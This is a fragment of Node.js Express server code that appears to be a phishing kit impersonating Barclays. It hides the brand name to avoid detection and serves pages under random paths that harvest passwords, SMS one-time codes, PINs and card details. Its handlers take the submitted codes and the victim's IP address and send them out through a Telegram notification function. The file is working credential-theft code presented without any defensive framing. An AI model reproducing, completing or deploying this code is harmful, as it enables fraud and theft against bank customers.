...
let target = "B-1a-1r-1c-1l-1y-1s"; // hadi hizyada;
target = target.split("-1");
target = target.join("");
let brand = "B-1a-1r-1c-1l-1y-1s"; // hadi hizyada;
brand = brand.split("-1");
brand = brand.join("");
...
app.get("/PPmP85AgNE4pnL5mWSM", (req, res) => { // pass:
  res.render("paso", { pass: req.session.username });
});
app.get("/loading", (req, res) => { // loading:
...
app.get("/LGknmeM9HwWUWSutj6mJ", (req, res) => { // SMS 2:
  res.render("opt-02");
});

app.get("/GPiNT9BQWt7KTDdaVmafx", (req, res) => { // pin:
  res.render("pitna");
});

app.get("/Yf5sn9Opi6BJksRuw78f", (req, res) => { // CC:
  res.render("cowaca");
});
...
app.post("/PiNT9BQWt7KTDdaVmafx", (req, res) => { // pin post
  let data = req.body;
  const clientIp = getAccurateClientIp(req);
  b4(data, clientIp);
  res.send({ OK: true });
...
function b4(data, ip) {
  let block = "";
  block += `${brand}  | [PIN] |  TEAM\n`;
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `USER: ${data.code}\nIP: ${ip}\n`;
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
...
function a3(data, ip) {
  sendTelegramNotification('[SMS]{Brcly}(1)', `OTP: ${data.code}`, ip);
}

// SMS notification function (second code)
function a4(data, ip) {
  sendTelegramNotification('[SMS]{Brcly}(2)', `OTP: ${data.code}`, ip);
}
